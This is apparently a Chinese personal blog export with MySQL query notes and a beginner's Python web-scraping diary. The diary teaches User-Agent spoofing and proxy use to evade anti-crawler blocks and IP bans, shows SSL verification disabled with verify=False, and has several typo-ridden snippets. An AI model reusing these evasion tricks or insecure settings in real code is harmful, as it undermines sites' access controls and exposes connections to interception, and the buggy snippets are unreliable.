<li>特点：</li>
</ul>
<ol>
<li><p>外连接的查询结果为主表中的所有记录</p>
<p>如果从表中有和他匹配的，则显示匹配值</p>
<p>如果从表中没有和它匹配的值，则显示null</p>
<p>外连接查询结果=内链接结果+主表中有而从表中没有的记录</p>
</li>
<li><p>左外连接，left join左边的是主表</p>
<p>右外连接，right join右边的是主表</p>
<p>左外右外和俩个表都换一下顺序，可以实现同样的效果</p>
</li>
</ol>
<ul>
<li><p>主表：查询内容较多的表格</p>
</li>
<li><p>全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的</p>
</li>
</ul>
<h6 id="交叉连接"><a href="#交叉连接" class="headerlink" title="交叉连接"></a>交叉连接</h6><ul>
<li>相当于用99语法实现的笛卡尔乘积</li>
</ul>
<p>图示：</p>
<p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBjOQf.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBjOQf.png"></p>
<p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBjXy8.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBjXy8.png"></p>
<h4 id="6、子查询"><a href="#6、子查询" class="headerlink" title="6、子查询"></a>6、子查询</h4><ol>
<li>含义：出现在其他语句中的select语句，称为子查询或内查询</li>
<li>分类：</li>
</ol>
<pre><code>按子查询出现的位置：
        select后面：
            仅仅支持标量子查询
        from后面：
            支持表子查询
        where或having后面： // 重点
            标量子查询       //  重点
            列子查询        // 重点
            行子查询        // 重点
        exists后面（相关子查询）
            表子查询
按结果集的行列数不同：
        标量子查询：结果集只有一行一列
        列子查询：结果集有一列多行
        行子查询：结果集有一行多列
        表子查询：结果集有多行多列</code></pre><ul>
<li>（一）where或having后面</li>
</ul>
<ol>
<li><p>标量子查询（单行子查询）</p>
</li>
<li><p>列子查询（多行子查询）</p>
</li>
<li><p>行子查询（多行多列）</p>
</li>
<li><p>特点：（1）子查询放在小括号内</p>
<p>​           （2）子查询一般放在条件的右侧</p>
<p>​            （3）标量子查询，一般搭配着单行操作符使用&lt;  &gt; =   &gt;=  &lt;=等</p>
<p>​                     列子查询，一般搭配多行操作符使用 in, any,some, all</p>
<p>​              (4)子查询的执行优先于主查询，因为主查询要用到子查询</p>
</li>
<li><p>标量子查询</p>
</li>
</ol>
<pre><code>案例：谁的工资比sam高？
#查询sam的工资
select salary
from employees
where last_name = &#39;sam&#39;；

#查询员工的信息，满足salary &gt; sam工资 的结果
select *
from employees
where salary &gt;(
    select salary
    from employees      //为更清晰的表达，子查询最好进行缩进
    where last_name = &#39;sam&#39;  
)；</code></pre><pre><code>案例：返回公司工资最少的员工的last_name,job_id,salary
#查询公司的最低工资
select min(salary)
from empolyees;

#查询last_name, job_id, salary, 要求salary= 公司的最低工资
select last_name, job_id, salary
from employees
where salary=(
    select min(salary)
    from empolyees
);</code></pre><ol start="2">
<li>列子查询(多行子查询）</li>
</ol>
<pre><code>案例：返回location_id是1400或1700的部门中的所有员工姓名
#查询location_id是1700或1400的部门编号
select department_id
from departments
where location_id in(1400, 1700);

#查询员工姓名，要求部门号是上个查询结果中的某一个
select employees
where department_id in(
    select department_id
    from departments
    where location_id in(1400, 1700)
);</code></pre><ol start="3">
<li><p>行子查询（多行多列）</p>
<p>略</p>
</li>
</ol>
<ul>
<li>（二）放在select后面的标量子查询</li>
</ul>
<pre><code>案例：查询每个部门的员工个数
select d.*, (
    select count(*)
    from empolyees e
    where e.department_id = d.&#39;department_id&#39;
) 个数
from departments d;</code></pre><ul>
<li>（三）放在from后面<ul>
<li>将子查询结果当成一张表，要求必须起别名</li>
</ul>
</li>
</ul>
<pre><code>案例：查询每个部门的平均工资的平均等级
#查询每个部门的平均工资
select avg(salary), department_id
from employees
group by department_id

#连接上个查询结果集和job_grades表，筛选条件平均工资
select ag_dep.*, g.&#39;grade_level&#39;
from(
    select avg(salary), department_id
    from employees
    group by department_id
) ag_dep
inner join job_grades g
on ag_dep.ag between lowest_sal and highest_sal;</code></pre><ul>
<li>（四）放在exists后面（相关子查询）<ul>
<li>能用exists的都能用in代替</li>
</ul>
</li>
</ul>
<pre><code>语法：
    exists 完整的查询语句
结果：0或1   //返回一个布尔值</code></pre><pre><code>案例：查询员工的部门名
select department_name
from departments d
where exists(
    select *
    from employees e
    where d.&#39;department_id&#39;=e.&#39;depaertment_id&#39;
);</code></pre><h4 id="7、分页查询"><a href="#7、分页查询" class="headerlink" title="7、分页查询"></a>7、分页查询</h4><ol>
<li>应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求</li>
<li>语法：</li>
</ol>
<pre><code>select 查询列表
from 表
连接类型 join 表2
on 连接条件
where 筛选条件
group by 分组字段
having 分组后的筛选
order by 排序的字段
limit offset, size;

offset要显示条目的起始索引（起始索引从0开始）
size 要显示的条目个数</code></pre><ol start="3">
<li>案例：查询前五条员工信息</li>
</ol>
<pre><code>select * from employees limit 0, 5;</code></pre><ol start="4">
<li>案例2：查询11条—第25条</li>
</ol>
<pre><code>select * from employees limit 10, 15;</code></pre><ol start="5">
<li>案例3：有奖金的员工信息，并且工资较高的前10名显示出来</li>
</ol>
<pre><code>select *
from employees
where commission_pic is not null
order by salsry desc
limit 10;</code></pre><ol start="6">
<li>特点：</li>
</ol>
<ul>
<li>limit语句放在查询语句德尔最后</li>
<li>公式：要显示的页数page，每页的条目数size</li>
</ul>
<pre><code>select 查询列表
from 表
limit (page-1)*size, size;</code></pre><h4 id="8、联合查询"><a href="#8、联合查询" class="headerlink" title="8、联合查询"></a>8、联合查询</h4><ol>
<li>union联合 ：将多个查询语句的结果合并成一个结果</li>
<li>语法：</li>
</ol>
<pre><code>查询语句1
union
查询语句2
union
...</code></pre><ol start="3">
<li>案例：查询部门编号&gt;90或邮箱包含a的员工信息</li>
</ol>
<pre><code>select *
from employees
where email like &#39;%a%&#39; or deaprtment_id&gt;90;

select *
from employees
where email like &#39;%a%&#39;
union
select *
from employees
where deparment_id&gt;90;</code></pre><ol start="4">
<li>特点：</li>
</ol>
<ul>
<li>要求多条查询语句的查询列数是一致的</li>
<li>要求多条查询语句的查询的每一列的类型和顺序最好一致</li>
<li>union关键字默认去重，如果使用union all 可以包含重复选项</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>SQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实战</title>
    <url>/2020/05/03/spider/</url>
    <content><![CDATA[<h1 id="爬虫第一天"><a href="#爬虫第一天" class="headerlink" title="爬虫第一天"></a>爬虫第一天</h1><ul>
<li>urllib太过古老，因此不加以深入学习</li>
</ul>
<h3 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h3><p>requests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。<br>作用：模拟浏览器发送请求。</p>
<p>如何使用：（requests模块的编码流程）<br>    -指定url<br>    -发起请求（get或post）<br>    -获取响应数据<br>    -持久化存储（数据库或本地存储）</p>
<p>环境安装：<br>    -pip或pycharm安装<br>    -anaconda自带（方便已装）</p>
<span id="more"></span>

<h3 id="实战编码："><a href="#实战编码：" class="headerlink" title="实战编码："></a><strong>实战编码：</strong></h3><pre><code>- 需求：爬取拉勾网首页的数据
    示例：</code></pre><pre><code class="python">import requests

if __name__ == &#39;__main__&#39;:
    #step 1:指定url
    url = &quot;https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6&quot;

    #step_2:发起请求
    #get会返回一个响应对象
    response = requests.get(url=url)

    #step_3:获取相应数据(.text返回的是字符串形式的响应数据)
    page_text = response.text
    print(page_text)

    #step_4:持久化存储
    with open(&#39;./lagou.html&#39;, &#39;w&#39;, encoding = &#39;utf-8&#39;) as fp:
        fp.write(page_text)
    print(&#39;爬取数据结束&#39;)</code></pre>
<ul>
<li><p>以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略</p>
</li>
<li><p>示例：<br>UA:User-Agent (请求载体的身份标识)<br>UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，<br>说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示<br>该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。<br>UA伪装:将对应的请求载体身份标识伪装成一款浏览器</p>
</li>
</ul>
<pre><code class="python">import requests

if __name__ == &#39;__main__&#39;:
    # UA伪装：将对应的User-Agent封装到一个字典中
    headers = &#123;
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;
    &#125;

    url = &#39;https://www.sogou.com/web?&#39;

    #处理url携带的参数：封装到字典中（参数为问号后面的）
    kw = input(&#39;enter a word:&#39;)
    param = &#123;
        &#39;query&#39;: kw
    &#125;

    # 需求的响应返回的是一个对象，对象应实例化
    response = requests.get(url=url, params=param, headers=headers)

    # 确认相应数据是txt类型的
    page_text = response.text
    fileName = kw+&#39;.html&#39;
    with open(fileName, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:
        fp.write(page_text)
    print(&#39;保存成功。。。&#39;)
</code></pre>
<h1 id="爬虫第二天"><a href="#爬虫第二天" class="headerlink" title="爬虫第二天"></a>爬虫第二天</h1><h3 id="有关于ajax"><a href="#有关于ajax" class="headerlink" title="有关于ajax"></a>有关于ajax</h3><h4 id="爬取百度翻译的内容"><a href="#爬取百度翻译的内容" class="headerlink" title="爬取百度翻译的内容"></a>爬取百度翻译的内容</h4><pre><code class="python">import requests
import json

if __name__ == &#39;__main__&#39;:
    #获取url
    post_url = &#39;https://fanyi.baidu.com/sug&#39;
    #进行UA伪装
    headers = &#123;
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;
    &#125;
    #post请求的参数处理（同get请求一致）
    word = input(&#39;输入你想翻译的东西:&#39;)
    data = &#123;
        &#39;kw&#39;: word
    &#125;
    #发送请求并生成响应
    response = requests.post(url=post_url, data=data, headers=headers)
    #获取响应数据:
    #json()方法返回的是obj （如果确认响应数据是json类型的）
    dic_obj = response.json()

    #持久化存储
    filename = word+&#39;.json&#39;
    with open(filename, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:
        json.dump(dic_obj, fp=fp, ensure_ascii=False)

    #将jaon格式转化成dict格式
    with open(filename, &#39;r&#39;, encoding=&#39;utf-8&#39;) as fp:
        great = json.load(fp)

    #将字典格式化输出(此字典中存在字典与列表的嵌套现象)
    for k, v in great.items():
        if type(v) == list:
            for i in v:
                print(i)
        else:
            print(k)
            print(v)

    print(&#39;end...&#39;)
</code></pre>
<h3 id="爬取豆瓣电影信息"><a href="#爬取豆瓣电影信息" class="headerlink" title="爬取豆瓣电影信息"></a>爬取豆瓣电影信息</h3><pre><code class="python">##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax

import requests
import json

if __name__ == &#39;__main__&#39;:
    url = &#39;https://movie.douban.com/j/chart/top_list&#39;
    param = &#123;
        &#39;type&#39;: &#39; 24&#39;,
        &#39;interval_id&#39;: &#39; 100:90&#39;,
        &#39;action&#39;: &#39;&#39;,
        &#39;start&#39;: &#39; 1&#39;,
        &#39;limit&#39;: &#39; 20&#39;,
    &#125;
    headers = &#123;
        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;
    &#125;

    response = requests.get(url=url, params=param, headers=headers)

    list_data = response.json()

    with open(&#39;./douban.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:
        json.dump(list_data, fp, ensure_ascii=False)

    with open(&#39;./douban.json&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;) as fp:
        great = json.load(fp)

    print(great)</code></pre>
<h1 id="爬虫学习第三天"><a href="#爬虫学习第三天" class="headerlink" title="爬虫学习第三天"></a>爬虫学习第三天</h1><h3 id="爬取国家药监总局部分信息"><a href="#爬取国家药监总局部分信息" class="headerlink" title="爬取国家药监总局部分信息"></a>爬取国家药监总局部分信息</h3><pre><code class="python">import requests
import json

if __name__ == &#39;__main__&#39;:
    url = &#39;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList&#39;
    url_2 = &#39;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById&#39;
    headers = &#123;
        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;
    &#125;
    #爬取的页数
    page_ = input(&quot;请输入您想爬取的信息页数：&quot;)
    for page in range(1, int(page_)+1):
        data = &#123;
            &#39;on&#39;: &#39;true&#39;,
            &#39;page&#39;: page,
            &#39;pageSize&#39;: &#39;15&#39;,
            &#39;productName&#39;: &#39;&#39;,
            &#39;conditionType&#39;: &#39;1&#39;,
            &#39;applyname&#39;: &#39;&#39;,
            &#39;applysn&#39;: &#39;&#39;,
        &#125;
        #id_list have many ids
        id_list = []
        message = []

        json_list = requests.post(url=url, data=data, headers=headers).json()
        #id_a is a dict
        for id_a in json_list[&quot;list&quot;]:
            id_list.append(id_a[&quot;ID&quot;])
            #id_b是id号
        for id_b in id_list:
                data_2 = &#123;
                    &quot;id&quot;: str(id_b)
                &#125;
                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()
                print(detail_message)
                message.append(detail_message)
    with open(&#39;./药物信息.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:
        json.dump(message, fp, ensure_ascii=False)
    print(&#39;end...&#39;)

&#39;&#39;&#39;此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了&#39;&#39;&#39;
&#39;&#39;&#39;出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术&#39;&#39;&#39;</code></pre>
<h3 id="数据解析概述"><a href="#数据解析概述" class="headerlink" title="数据解析概述"></a>数据解析概述</h3><ul>
<li><p>聚焦爬虫：爬取页面中指定的页面内容</p>
<pre><code>-编码流程
    1、指定url
    2、发起请求
    3、获取相应数据
    4、持久化存储</code></pre><p>-数据解析分类：</p>
<pre><code>    -正则
    -bs4
    -xpath</code></pre><p>-数据解析原理概述</p>
<pre><code>    -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储
    -1、进行指定标签的定位
    -2、标签或者标签对应属性中存储的数据值进行提取（解析）</code></pre></li>
</ul>
<h3 id="图片的爬取代码"><a href="#图片的爬取代码" class="headerlink" title="图片的爬取代码"></a>图片的爬取代码</h3><pre><code class="python">import requests
#此处url为图片地址，而非链接【地址比链接短】
url = &#39;https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&amp;h=195&amp;c=7&amp;o=5&amp;dpr=1.25&amp;pid=1.7&#39;
headers = &#123;
        &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;
&#125;
#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存
data_pict = requests.get(url=url, headers=headers).content
with open(&#39;./beauty_pict.jpg&#39;, &#39;wb&#39;) as fp:
    fp.write(data_pict)</code></pre>
<h1 id="爬虫第四天"><a href="#爬虫第四天" class="headerlink" title="爬虫第四天"></a>爬虫第四天</h1><h3 id="爬取百度图片（星空图片）"><a href="#爬取百度图片（星空图片）" class="headerlink" title="爬取百度图片（星空图片）"></a>爬取百度图片（星空图片）</h3><pre><code class="python">import requests
import re
import os
import time

if __name__ == &#39;__main__&#39;:
    #创建一个文件夹，存放图片
    if not os.path.exists(&#39;./star_sky&#39;):
        os.mkdir(&#39;./star_sky&#39;)

    url = &#39;https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&amp;qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&amp;form=IGRE&amp;first=1&amp;cw=1117&amp;ch=714&#39;
    headers = &#123;
            &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;
    &#125;
    data_pict = requests.get(url=url, headers=headers).text

    #正则匹配
    ex = &#39;&lt;a class=.*?murl&amp;quot;:&amp;quot;(.*?)&amp;quot;.*?&gt;&#39;
    star_list = re.findall(ex, data_pict, re.S)
    for i in star_list:
        url_2 = i
        #请求到了图片的二进制数据
        data_2_pict = requests.get(url=url_2, headers=headers).content
        #为图片设置名称
        img_name = url_2.split(&quot;/&quot;)[-1]
        img_path = &#39;./star_sky/&#39; + img_name
        with open(img_path, &#39;wb&#39;) as fp:
            fp.write(data_2_pict)
        print(img_name + &#39;...successful&#39;)
        time.sleep(0.1)

****************************************未完，，待更新********************************************</code></pre>
<h3 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h3><ul>
<li>xpath解析：最常用且最便捷高效的一种解析方式，具有通用性<pre><code>-xpath解析原理：
    -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中
    -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获
-如何实例化一个etree对象
    *from lxml import etree
    -1、将 本地的html文档中的源代码数据加载到etree对象中：
        etree.parse(filepath)
    -2、可以将从互联网上获取的数据加载到该对象中
        etree.HTML(&#39;page_text&#39;)###page_text就是获取的响应数据
    - xpath(&#39;xpath表达式&#39;)
    -xpath表达式：
            - / ：表示的是从根目录结点开始定位，表示的是一个层级
                    - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）
                    -属性定位：tag[@attrName=&quot;attrValue&quot;]
                    -索引定位：p[n] 索引是从1开始的
                    -取文本：
        - /text() 获取的是标签中直系的文本内容
        - //text() 标签中非直系的文本内容（所有的文本内容）
        -[0] 可以去除列表框
            -取属性
        -/@attrName</code></pre></li>
</ul>
<h3 id="xpath代码实战示例："><a href="#xpath代码实战示例：" class="headerlink" title="xpath代码实战示例："></a>xpath代码实战示例：</h3><pre><code class="python">#爬取妹子图片，总共有俩千多张
import requests
from lxml import etree
import os

if __name__ == &#39;__main__&#39;:
    ii = 1
    if not os.path.exists(&#39;./girl&#39;):
        os.mkdir(&#39;./girl&#39;)
    url_list = [i for i in range(1, 50)]
    url_list[1] = &#39;&#39;

    for page in url_list:
        url = &#39;https://www.lanvshen.com/zhongguo/&#39; + str(page) +&#39;.html&#39;
        headers = &#123;
            &#39;User-Agent&#39; : &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;
        &#125;
        get_text = requests.get(url=url, headers=headers)
        tree = etree.HTML(get_text.text)
        pict_ = tree.xpath(&#39;//div[@class=&quot;hezi&quot;]//li&#39;)
        for it_ in pict_:
            img_url = it_.xpath(&#39;./a/img/@src&#39;)[0]
            img_name = str(ii) + &#39;.jpg&#39;
            img = requests.get(url=img_url, headers=headers).content
            img_path = &#39;./girl/&#39; + img_name
            with open(img_path, &#39;wb&#39;) as fp:
                fp.write(img)
            print(img_name + &#39;sccuessful...&#39;)
            ii = ii + 1

##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢
##后期将学习爬取高清图片，并进行分布式爬取
</code></pre>
<h3 id="ip代理"><a href="#ip代理" class="headerlink" title="ip代理"></a>ip代理</h3><ol>
<li>代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，<br>代理服务器拿到目的网站的数据后，再转发给我们的代码</li>
<li><a href="http://httpbin.org">这个网站可以方便的查看http请求的一些参数</a> </li>
<li>在代码中(requests模块)使用代理：</li>
</ol>
<pre><code class="python">    import requests

    url = &#39;http://httpbin.org&#39;
    headers = &#123;
        &#39;User-Anget&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;
    &#125;

    #设置代理
    proxy = &#123;
        &#39;http&#39;: &#39;123.54.194.96:38661&#39;
    &#125;
    get_text = requerts.get(url=url, headers=headers, proxies=proxy).text
    print(get_text)</code></pre>
<ol start="4">
<li>网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效</li>
<li>代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们<br>的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的</li>
</ol>
<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><ul>
<li><p><a href="http://blog.sina.com.cn/s/blog_628571e601019uis.html">cookie与session的差异</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd">cookie技术深入</a>             </p>
<ul>
<li>Cookie是什么？     </li>
</ul>
<p>Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。<br>Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。</p>
<ul>
<li><p>为什么需要Cookie？ </p>
<p>因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。<br>所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。</p>
</li>
<li><p>Cookie能做什么？ </p>
<p>Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它<br>不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。</p>
</li>
<li><p>Cookie 的限制</p>
<p>大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，<br>或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。<br>浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；<br>如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie<br>总数作出绝对限制，通常为 300 个。</p>
</li>
</ul>
</li>
</ul>
<p><img "" class="lazyload placeholder" data-original="C:/Users/Acer/Desktop/%E7%AC%94%E8%AE%B0/%E7%88%AC%E8%99%AB_day4_files/1.jpg" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="Cookie示意图">    </p>
<ul>
<li>处理cookie<br>如果想要在多次请求中共享cookie，那么应该使用session</li>
</ul>
<h3 id="处理不信任的SSL证书"><a href="#处理不信任的SSL证书" class="headerlink" title="处理不信任的SSL证书"></a>处理不信任的SSL证书</h3><pre><code class="python">resp = resquests.get(url=url, vrrify=False).content
</code></pre>
<h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><ul>
<li>多线程之生产者与消费者模型</li>
</ul>
<ul>
<li>代码示例一：(Lock版)</li>
</ul>
<pre><code class="python">    &quot;&quot;&quot;
    关于多线程生产者消费者模型
    &quot;&quot;&quot;
    import threading
    import time
    import random

    gMoney = 1000
    gLock = threading.Lock()
    gTotalTimes = 10
    gTimes = 0


    # 生产线程Producer
    class Producer(threading.Thread):
        def run(self):
            global gMoney
            global gTimes
            while True:
                money = random.randint(100, 1000)
                gLock.acquire()
                if gTimes &gt;= gTotalTimes:
                    gLock.release()
                    break
                gMoney += money
                print(&#39;&#123;&#125;生产了&#123;&#125;元钱，剩余&#123;&#125;元钱&#39;
                      .format(threading.current_thread(), money, gMoney))
                gTimes += 1
                gLock.release()
                time.sleep(0.5)


    # 消费线程Consumer
    class Consumer(threading.Thread):
        def run(self):
            global gMoney
            while True:
                money = random.randint(100, 1000)
                gLock.acquire()
                if gMoney &gt;= money:
                    gMoney -= money
                    print(&#39;&#123;&#125;消费者消费了&#123;&#125;元钱，剩余&#123;&#125;元钱&#39;
                          .format(threading.current_thread(), money, gMoney))
                # 若剩余金额不足以消费，则退出循环
                else:
                    if gTimes &gt;= gTotalTimes:
                        gLock.release()
                        break
                    print(&#39;&#123;&#125;消费者准备消费&#123;&#125;元钱，剩余&#123;&#125;元钱，不足！&#39;
                          .format(threading.current_thread(), money, gMoney))
                gLock.release()
                time.sleep(0.5)


    def mainIt():
        # 设置3个消费线程
        for x in range(3):
            t = Consumer(name=&#39;消费者线程&#123;&#125;&#39;.format(x))
            t.start()
            # 设置5个生产线程

        for x in range(5):
            t = Producer(name=&#39;生产者线程&#123;&#125;&#39;.format(x))
            t.start()


    if __name__ == &#39;__main__&#39;:
        mainIt()
</code></pre>
<ul>
<li>代码示例二：(condition版)</li>
</ul>
<pre><code class="python">
    import threading
    import random
    import time

    gMoney = 1000
    gCondition = threading.Condition()  # 等同于threading.Lock
    gTimes = 0
    gTotalTimes = 5


    class Producer(threading.Thread):
        def run(self):
            global gMoney
            global gCondition
            global gTimes
            while True:
                money = random.randint(100, 1000)
                gCondition.acquire()  # 加锁（全局变量改变前（gMoney））
                if gTimes &gt;= gTotalTimes:
                    gCondition.release()  # 解锁
                    print(&quot;当前生产者总共生产了%s次&quot; % gTimes)
                    break
                gMoney += money
                print(&quot;%s当前存入%s元钱，剩余%s元线&quot; % (threading.current_thread(), money, gMoney))
                gTimes += 1
                gCondition.notify_all()  # 通知正在等待的线程（wait）
                gCondition.release()
                time.sleep(0.5)


    class Cosumer(threading.Thread):
        def run(self):
            global gMoney
            while True:
                money = random.randint(100, 1000)
                gCondition.acquire()
                while gMoney &lt; money:
                    if gTimes &gt;= gTotalTimes:
                        gCondition.release()
                        return
                    print(&quot;%s准备消费%d元钱，剩余%d元钱，不足&quot; % (threading.current_thread(), money, gMoney))
                    gCondition.wait()  # 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）
                gMoney -= money
                print(&quot;%s消费了%d元钱，剩余%d元钱&quot; % (threading.current_thread(), money, gMoney))
                gCondition.release()
                time.sleep(0.5)


    def main():
        for x in range(3):
            t = Cosumer(name=&quot;消费者线程%s&quot; % x)
            t.start()
        for y in range(5):
            t1 = Producer(name=&quot;生产者线程%s&quot; % y)
            t1.start()


    if __name__ == &#39;__main__&#39;:
        main()
</code></pre>
<ul>
<li>多线程Lock与condition方法总结：<ol>
<li>在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，<br>这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费</li>
<li>当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，<br>使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就<br>减少了循环过程中因上锁解锁而导致的CPu资源浪费</li>
</ol>
</li>
</ul>
<ul>
<li>Queue线程安全队列<br>在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块<br>叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要<br>么做完。可使用队列来实现线程的同步。相关函数如下：<br>作用：<br>　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。<br>　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。</li>
</ul>
<ol>
<li><p>Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限</p>
</li>
<li><p>Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限</p>
</li>
<li><p>Queue.qsize()   返回队列的大小</p>
</li>
<li><p>Queue.empty()   如果队列为空，返回True,反之False</p>
</li>
<li><p>Queue.full()   如果队列满了，返回True,反之False</p>
</li>
<li><p>Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间</p>
</li>
<li><p>Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间</p>
</li>
<li><p>Queue.queue.clear()   清空队列</p>
</li>
<li><p>class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高</p>
</li>
<li><p>Queue.get(timeout = 1)如果1秒后没取到数据就退出</p>
</li>
<li><p>Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常</p>
</li>
<li><p>Queue.task_done()后续调用告诉队列，任务的处理是完整的。</p>
</li>
</ol>
<pre><code class="python">    from queue import Queue
    import time
    import threading


    # 在队列中放入数值
    def set_value(q):
        index = 0
        while True:
            q.put(index)
            index += 1
            time.sleep(0.8)


    # 取出队列中的数值
    def get_value(q):
        while True:
            print(q.get())


    def main():
        # 产生一个队列
        q = Queue(1)
        t1 = threading.Thread(target=set_value, args=[q])
        t2 = threading.Thread(target=get_value, args=[q])

        t1.start()
        t2.start()


    if __name__ == &#39;__main__&#39;:
        main()
</code></pre>
<ul>
<li>生产者与消费者模型</li>
</ul>
<ul>
<li>代码示例三：(Queue版)</li>
</ul>
<pre><code class="python">    import threading,time
    #python2  from Queue import Queue
    #python3
    import queue

    class Producer(threading.Thread):
        def run(self):
            global queue
            count = 0
            while True:
                #qsize返回queue内部长度
